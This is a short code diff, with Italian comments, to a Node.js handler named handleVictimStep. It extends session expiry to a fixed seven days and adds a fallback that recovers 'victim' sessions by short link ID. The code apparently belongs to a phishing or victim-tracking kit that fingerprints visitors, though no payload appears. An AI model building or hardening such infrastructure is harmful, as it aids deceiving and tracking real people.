@@ -52,7 +52,7 @@ async function handleVictimStep(req, res, currentStep) {
       metadata: sequenceData.metadata,
       completed: false,
       createdAt: Date.now(),
-      expiresAt: Date.now() + (urlData.expiry_days * 24 * 60 * 60 * 1000)
+      expiresAt: Date.now() + (7 * 24 * 60 * 60 * 1000) // Sempre 7 giorni per sessioni
     };
     
     // Salva percorso in DB
@@ -98,8 +98,15 @@ async function handleVictimStep(req, res, currentStep) {
     if (pathData) {
       logger.info('VICTIM', 'DB fallback successful', { pathHash });
     } else {
-      logger.error('VICTIM', 'Session completely lost', { shortId, fingerprint });
-      return res.status(400).send('<h1>Session expired - <a href="/v/' + shortId + '">restart here</a></h1>');
+      // Ultimo tentativo: cerca qualsiasi sessione per questo shortId
+      logger.warn('VICTIM', 'Trying emergency fallback by shortId');
+      pathData = await db.getClientPathByShortId(shortId);
+      if (pathData) {
+        logger.info('VICTIM', 'Emergency fallback successful');
+      } else {
+        logger.error('VICTIM', 'Session completely lost', { shortId, fingerprint });
+        return res.status(400).send('<h1>Session expired - <a href="/v/' + shortId + '">restart here</a></h1>');
+      }
     }
   }
   
